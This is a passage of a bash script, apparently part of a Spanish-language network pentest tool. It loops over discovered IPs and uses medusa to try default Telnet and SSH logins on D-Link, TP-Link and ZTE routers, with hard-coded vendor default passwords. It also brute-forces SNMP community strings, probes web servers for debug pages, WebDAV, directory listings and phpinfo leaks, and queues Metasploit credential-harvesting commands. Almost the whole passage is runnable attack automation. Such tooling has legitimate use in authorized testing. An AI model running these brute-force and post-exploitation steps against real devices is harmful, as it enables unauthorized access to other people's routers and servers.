		egrep -iq "23/open" .nmap_1000p/"$ip"_tcp.grep
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then			
			echo -e "\t Probando Telnet \n $RESET"
			medusa -h $ip -u admin -p admin -M telnet >> logs/vulnerabilidades/"$ip"_23_passwordDefecto.txt 2>/dev/null			
			medusa -h $ip -u 1234 -p 1234 -M telnet >> logs/vulnerabilidades/"$ip"_23_passwordDefecto.txt 2>/dev/null			
			medusa -h $ip -u root -p 12345 -M telnet >> logs/vulnerabilidades/"$ip"_23_passwordDefecto.txt 2>/dev/null			
			medusa -h $ip -u root -p root -M telnet >> logs/vulnerabilidades/"$ip"_23_passwordDefecto.txt 2>/dev/null			
			grep --color=never SUCCESS logs/vulnerabilidades/"$ip"_23_passwordDefecto.txt > .vulnerabilidades/"$ip"_23_passwordDefecto.txt
			
		fi		

		egrep -iq "22/open" .nmap_1000p/"$ip"_tcp.grep
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then			
			echo -e "\t Probando SSH \n $RESET"
			medusa -h $ip -u admin -p admin -M ssh >> logs/vulnerabilidades/"$ip"_22_passwordDefecto.txt 2>/dev/null			
			medusa -h $ip -u 1234 -p 1234 -M ssh >> logs/vulnerabilidades/"$ip"_22_passwordDefecto.txt 2>/dev/null			
			medusa -h $ip -u root -p 12345 -M ssh >> logs/vulnerabilidades/"$ip"_22_passwordDefecto.txt 2>/dev/null			
			medusa -h $ip -u root -p root -M ssh >> logs/vulnerabilidades/"$ip"_22_passwordDefecto.txt 2>/dev/null			
		fi					
				
		grep --color=never SUCCESS logs/vulnerabilidades/"$ip"_22_passwordDefecto.txt > .vulnerabilidades/"$ip"_22_passwordDefecto.txt
		echo ""
 	done <.servicios/d-link.txt	
	insert_data
fi



# tp-link default password
if [ -f .servicios/tp-link.txt ]
then
	echo -e "$OKBLUE #################### tp-link (`wc -l .servicios/tp-link.txt`) ######################$RESET"	    
	while read ip     
	do     						
		echo -e "[+] Escaneando $ip"	
		
		egrep -iq "23/open" .nmap_1000p/"$ip"_tcp.grep
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then			
			echo -e "\t Probando Telnet \n $RESET"
			medusa -h $ip -u admin -p admin -M telnet >> logs/vulnerabilidades/"$ip"_23_passwordDefecto.txt 2>/dev/null			
			grep --color=never SUCCESS logs/vulnerabilidades/"$ip"_23_passwordDefecto.txt > .vulnerabilidades/"$ip"_23_passwordDefecto.txt
			
		fi		

		egrep -iq "22/open" .nmap_1000p/"$ip"_tcp.grep
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then			
			echo -e "\t Probando SSH \n $RESET"
			medusa -h $ip -u admin -p admin -M ssh >> logs/vulnerabilidades/"$ip"_22_passwordDefecto.txt 2>/dev/null			
			grep --color=never SUCCESS logs/vulnerabilidades/"$ip"_22_passwordDefecto.txt > .vulnerabilidades/"$ip"_22_passwordDefecto.txt
		fi					
						
		echo ""
 	done <.servicios/tp-link.txt	
	insert_data
fi


# ZTE default password
if [ -f .servicios/ZTE.txt ]
then
	echo -e "$OKBLUE #################### ZTE (`wc -l .servicios/ZTE.txt`) ######################$RESET"	    
	while read ip     
	do     						
		echo -e "[+] Escaneando $ip"	
		
		egrep -iq "23/open" .nmap_1000p/"$ip"_tcp.grep
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then			
			echo -e "\t Probando Telnet \n $RESET"
			medusa -h $ip -u admin -p admin -M telnet >> logs/vulnerabilidades/"$ip"_23_passwordDefecto.txt 2>/dev/null
			medusa -h $ip -u zte -p zte -M telnet >> logs/vulnerabilidades/"$ip"_23_passwordDefecto.txt 2>/dev/null
			medusa -h $ip -u ZXDSL -p ZXDSL -M telnet >> logs/vulnerabilidades/"$ip"_23_passwordDefecto.txt 2>/dev/null
			medusa -h $ip -u user -p user -M telnet >> logs/vulnerabilidades/"$ip"_23_passwordDefecto.txt 2>/dev/null
			medusa -h $ip -u on -p on -M telnet >> logs/vulnerabilidades/"$ip"_23_passwordDefecto.txt 2>/dev/null
			medusa -h $ip -u root -p Zte521 -M telnet >> logs/vulnerabilidades/"$ip"_23_passwordDefecto.txt 2>/dev/null
			medusa -h $ip -u root -p 'W!n0&oO7.' -M telnet >> logs/vulnerabilidades/"$ip"_23_passwordDefecto.txt 2>/dev/null
			
			grep --color=never SUCCESS logs/vulnerabilidades/"$ip"_23_ZTE.txt > .vulnerabilidades/"$ip"_23_passwordDefecto.txt 2>/dev/null			
		fi
		#exploit 
		#sendcmd 1 DB p DevAuthInfo

		egrep -iq "22/open" .nmap_1000p/"$ip"_tcp.grep
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then			
			echo -e "\t Probando SSH \n $RESET"
			medusa -h $ip -u admin -p admin -M ssh >> logs/vulnerabilidades/"$ip"_22_passwordDefecto.txt 2>/dev/null
			medusa -h $ip -u zte -p zte -M ssh >> logs/vulnerabilidades/"$ip"_22_passwordDefecto.txt 2>/dev/null
			medusa -h $ip -u ZXDSL -p ZXDSL -M ssh >> logs/vulnerabilidades/"$ip"_22_passwordDefecto.txt 2>/dev/null
			medusa -h $ip -u user -p user -M ssh >> logs/vulnerabilidades/"$ip"_22_passwordDefecto.txt 2>/dev/null
			medusa -h $ip -u on -p on -M ssh >> logs/vulnerabilidades/"$ip"_22_passwordDefecto.txt 2>/dev/null
			medusa -h $ip -u root -p Zte521 -M ssh >> logs/vulnerabilidades/"$ip"_22_passwordDefecto.txt 2>/dev/null
			medusa -h $ip -u root -p 'W!n0&oO7.' -M ssh >> logs/vulnerabilidades/"$ip"_22_passwordDefecto.txt 2>/dev/null
			grep --color=never SUCCESS logs/vulnerabilidades/"$ip"_22_passwordDefecto.txt > .vulnerabilidades/"$ip"_22_passwordDefecto.txt 2>dev/null
		
		fi
		#exploit 
		#sendcmd 1 DB p DevAuthInfo	
		
		
		egrep -iq "80/open" .nmap_1000p/"$ip"_tcp.grep
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then			
			echo -e "\t Probando HTTP \n $RESET"	
			echo "user" > pass.txt
			passWeb.pl -t $ip -p 80 -d / -m zte -u user -f pass.txt  > logs/vulnerabilidades/"$ip"_80_passwordDefecto.txt 2>/dev/null
			grep "Password encontrado" logs/vulnerabilidades/"$ip"_80_passwordDefecto.txt > .vulnerabilidades/"$ip"_80_passwordDefecto.txt 2>/dev/null
		fi					
						
		echo ""
 	done <.servicios/ZTE.txt
	
	insert_data
fi

cat .servicios/snmp2.txt .servicios/linksys.txt .servicios/Netgear.txt .servicios/pfsense.txt .servicios/ubiquiti.txt .servicios/mikrotik.txt .servicios/NetScreen.txt  .servicios/fortinet.txt .servicios/cisco.txt  .servicios/ciscoASA.txt .servicios/3com.txt 2>/dev/null | sort | uniq > .servicios/snmp.txt; rm .servicios/snmp2.txt  2>/dev/null
find .servicios -size  0 -print0 |xargs -0 rm 2>/dev/null # borrar archivos vacios

if [ -f .servicios/snmp.txt ]
then
	echo -e "$OKBLUE #################### SNMP (`wc -l .servicios/snmp.txt`) ######################$RESET"	    
	
	echo -e "[+] Escaneando $ip"
	echo -e "\t[+] Probando comunity string comunes"
	onesixtyone -c /usr/share/lanscanner/community.txt -i .servicios/snmp.txt > .enumeracion2/dispositivos-snmp2.txt
	sed 's/] 1/] \n1/g' -i .enumeracion2/dispositivos-snmp2.txt	# corregir error de onesixtyone
	cat .enumeracion2/dispositivos-snmp2.txt | grep --color=never "\[" | sed 's/ \[/~/g' |  sed 's/\] /~/g' | sort | sort | uniq > .enumeracion2/dispositivos-snmp.txt
	

	while read line; do
		ip=`echo $line | cut -f1 -d"~"`
		community=`echo $line | cut -f2 -d"~"`
		device=`echo $line | cut -f3 -d"~"`
		
		echo -e "\t[i] Dispositivo identificado: $device"
		echo -e "\t[+] Enumerando con el comunity string: $community"
		### snmp write ##
		snmp_write.pl -t $ip -c $community >> logs/vulnerabilidades/"$ip"_snmp_snmpCommunity.txt 2>/dev/null
		echo "" >>	logs/vulnerabilidades/"$ip"_snmp_snmpCommunity.txt 2>/dev/null
				
		### snmp bruteforce ##				
		
		if [[ ${device} == *"windows"*  ]];then 			
			echo -e "\t\t[+] Enumerando como dispositivo windows"
			snmpbrute.py -t $ip --windows --auto >> logs/vulnerabilidades/"$ip"_snmp_snmpCommunity.txt 2>/dev/null 
		fi
			
		if [[ (${device} == *"linux"* || ${device} == *"Ubuntu"*  || ${device} == *"Linux"* ) && (${device} != *"linux host"* )]];then 
			echo -e "\t\t[+] Enumerando como dispositivo Linux" 
			snmpbrute.py -t $ip --linux --auto >> logs/vulnerabilidades/"$ip"_snmp_snmpCommunity.txt 2>/dev/null 
		fi										
			
		egrep -qi "HOSTNAME" logs/vulnerabilidades/"$ip"_snmp_snmpCommunity.txt
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then						
			echo ""	# Ya fue enumerado
		else
			echo -e "\t\t[+] Enumerando como dispositivo cisco" 			
			snmpbrute.py -t $ip --cisco --auto >> logs/vulnerabilidades/"$ip"_snmp_snmpCommunity.txt 2>/dev/null 
		fi		
		
		
		###### Revisar si no es impresora ######
		egrep -qi "Printer|JetDirect|LaserJet|KONICA|MULTI-ENVIRONMENT" logs/vulnerabilidades/"$ip"_snmp_snmpCommunity.txt
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then						
			echo -e "\t$OKGREEN[i] Es una impresora $RESET"
			#rm logs/vulnerabilidades/"$ip"_snmp_snmpCommunity.txt
		else
			echo -e "\t$OKRED[!] Enumeración SNMP realizada \n $RESET"
			cp logs/vulnerabilidades/"$ip"_snmp_snmpCommunity.txt .vulnerabilidades/"$ip"_snmp_snmpCommunity.txt	
		fi		
		#######################						
		
	done <.enumeracion2/dispositivos-snmp.txt
#	rm banners-snmp2.txt
	
	insert_data
	##################################
fi

############ vulnerabilidades relacionados a servidores web ########
	
# revisar si hay scripts ejecutandose
while true; do
	webbuster_instancias=`ps aux | egrep 'wampServer|directorios|nmap|joomscan|wpscan' | wc -l`		
	if [ "$webbuster_instancias" -gt 1 ]
	then
		echo -e "\t[i] Todavia hay scripts activos ($webbuster_instancias)"				
		sleep 20
	else
		break		
	fi
done	# done true	

cp logs/enumeracion/*_webdirectorios.txt .enumeracion/ 2>/dev/null # mover archivos para insertar en la bd
insert_data

########## test debug ###
egrep -i "Debug habilitado" .enumeracion2/* 2>/dev/null| while read -r line ; do	
	echo -e  "$OKRED[!] Debug habilitado $RESET"
    archivo_origen=`echo $line | cut -d ':' -f1`
    # .enumeracion2/181.115.186.245_443_webData.txt:~~~~ ~~~~~~Debug habilitado~~
    url_debug=${archivo_origen/_webData.txt/} #   $archivo_origen
    url_debug=${url_debug/.enumeracion2\//}   	
    url_debug=${url_debug/_/:}"/nonexistroute123"    	
    
    archivo_destino=$archivo_origen       
	archivo_destino=${archivo_destino/.enumeracion2/.vulnerabilidades}   
	archivo_destino=${archivo_destino/webData/debugHabilitado}   	
    contenido=`echo $line | cut -d ':' -f2-4`    
    echo $url_debug >> $archivo_destino   
done
#################################
	

########## revisando PROPFIND (webdav) ###
grep PROPFIND .enumeracion2/* 2>/dev/null| while read -r line ; do	
	echo -e  "$OKRED[!] Método PROPFIND detectado $RESET"
    archivo_origen=`echo $line | cut -d ':' -f1`
    archivo_destino=$archivo_origen       
	archivo_destino=${archivo_destino/.enumeracion2/.vulnerabilidades}   
	archivo_destino=${archivo_destino/admin/webdav}
	archivo_destino=${archivo_destino/webdirectorios/webdav}
	archivo_destino=${archivo_destino/webarchivos/webdav}
    contenido=`echo $line | cut -d ':' -f2-4`    
    echo $contenido >> $archivo_destino    
done
#################################


########## revisando Listado de directorios activos ###
#En directorios descubiertos
grep "Listado directorio" .enumeracion2/* 2>/dev/null| while read -r line ; do	
	echo -e  "$OKRED[!] Listado de directorio detectado $RESET"		
    archivo_origen=`echo $line | cut -d ':' -f1`
    #echo "archivo_origen $archivo_origen"
    archivo_destino=$archivo_origen       
	archivo_destino=${archivo_destino/.enumeracion2/.vulnerabilidades}   
	archivo_destino=${archivo_destino/webdirectorio/listadoDirectorio}   	
    contenido=`echo $line | cut -d ':' -f2-4 | cut -d "(" -f1`    
    #200 http://1.2.3.4:80/assets/
    #echo "contenido $contenido"
    echo $contenido >> $archivo_destino        
done

#En la raiz de los servidores
grep -i "index of" .enumeracion2/* 2>/dev/null| while read -r line ; do	
	echo -e  "$OKRED[!] Listado de directorio detectado $RESET"	
    archivo_origen=`echo $line | cut -d ':' -f1`
    #echo "archivo_origen $archivo_origen"
    archivo_destino=$archivo_origen       
	archivo_destino=${archivo_destino/.enumeracion2/.vulnerabilidades}   
	archivo_destino=${archivo_destino/webData/listadoDirectorio}   	
    contenido=`echo $line | cut -d ':' -f2-4 | cut -d "(" -f1`    
    #200 http://1.2.3.4:80/assets/
    #echo "contenido $contenido"
    echo $contenido >> $archivo_destino        
done
##############################################

########## revisando backdoors ###
grep "Backdoor" .enumeracion2/* 2>/dev/null| while read -r line ; do
	echo -e  "$OKRED[!] Posible backdoor detectado $RESET"	
    archivo_origen=`echo $line | cut -d ':' -f1`
    #echo "archivo_origen $archivo_origen"
    archivo_destino=$archivo_origen       
	archivo_destino=${archivo_destino/.enumeracion2/.vulnerabilidades}   
	archivo_destino=${archivo_destino/webarchivos/Backdoor}   	
    contenido=`echo $line | cut -d ':' -f2-4 | cut -d "(" -f1`    
    #200 http://1.2.3.4:80/assets/
    #echo "contenido $contenido"
    echo $contenido >> $archivo_destino        
done
#################################
# insertar datos 
insert_data



########## extrayendo informacion de divulgacionInformacion ###
for archivo in `ls logs/enumeracion/*_divulgacionInformacion.txt 2>/dev/null;`; do	
	#archivo = logs/enumeracion/190.186.131.162_443_divulgacionInformacion.txt	
	#archivo2 = 190.186.131.162_443_divulgacionInformacion.txt
	archivo2=`echo $archivo | cut -f3 -d"/"`	
	ip=`echo $archivo2 | cut -f1 -d"_"`
	port=`echo $archivo2 | cut -f2 -d"_"`
		
	for url in `cat $archivo`; do	
		#echo "url $url"
		#logs/vulnerabilidades/104.198.171.232_80_divulgacionInformacion.txt:
	   #if [[ (${url} == *"linux"* || ${device} == *"Ubuntu"*  || ${device} == *"Linux"* ) && (${device} != *"linux host"* )]];then 
		if [[ ${url} == *"error"* || ${url} == *"log"*  ]];then 			
			echo -e  "$OKRED[!] Archivo de error o log detectado! ($url) $RESET"			
			echo $url >> .vulnerabilidades/"$ip"_"$port"_divulgacionInformacion.txt
			echo "" >> .vulnerabilidades/"$ip"_"$port"_divulgacionInformacion.txt
		else
			echo -e "[+] Posible archivo PhpInfo ($url)" 
			phpinfo.pl -url "\"$url\"" >> logs/vulnerabilidades/"$ip"_"$port"_divulgacionInformacion.txt 2>/dev/null	
			
			egrep -iq "No es un archivo PHPinfo" logs/vulnerabilidades/"$ip"_"$port"_divulgacionInformacion.txt
			greprc=$?
			if [[ $greprc -eq 1 ]] ; then													
				echo -e  "$OKRED[!] Es un archivo phpinfo valido ! $RESET"
				echo "URL  $url" >> .vulnerabilidades/"$ip"_"$port"_divulgacionInformacion.txt
				echo ""  >> .vulnerabilidades/"$ip"_"$port"_divulgacionInformacion.txt
				cat logs/vulnerabilidades/"$ip"_"$port"_divulgacionInformacion.txt >> .vulnerabilidades/"$ip"_"$port"_divulgacionInformacion.txt
			else
				echo -e "[i] No es un archivo phpinfo valido"
			fi	#archivo phpinfo
		fi	
	done  								
done
insert_data
#################################


echo "spool `pwd`/metasploit/IP-creds.txt" > command-metasploit.txt
echo "resource /usr/share/lanscanner/postExploiter/creds.rc" >> command-metasploit.txt
echo "setg SESSION X" >> command-metasploit.txt
echo "resource /usr/share/lanscanner/postExploiter/enum.rc" >> command-metasploit.txt

echo -e "\t $OKBLUE REVISANDO ERRORES $RESET"
grep -ira "timed out" * logs/enumeracion/* 2>/dev/null | egrep -v "webClone|transfer not allowed"
grep -ira "Can't connect" * logs/enumeracion/* 2>/dev/null | egrep -v "webClone|transfer not allowed"
